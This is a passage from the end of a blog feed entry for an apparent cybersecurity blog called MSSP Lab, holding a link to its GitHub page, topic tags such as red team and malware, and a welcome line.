&lt;p&gt;Our Github repo: &lt;a href=&quot;https://github.com/MSSPLab&quot;&gt;https://github.com/MSSPLab&lt;/a&gt;&lt;/p&gt;</content><author><name>MSSP Lab</name></author><category term="tutorial" /><category term="redteam" /><category term="blueteam" /><category term="purpleteam" /><category term="pentest" /><category term="malware" /><summary type="html">Welcome to our cybersecurity blog!</summary></entry></feed>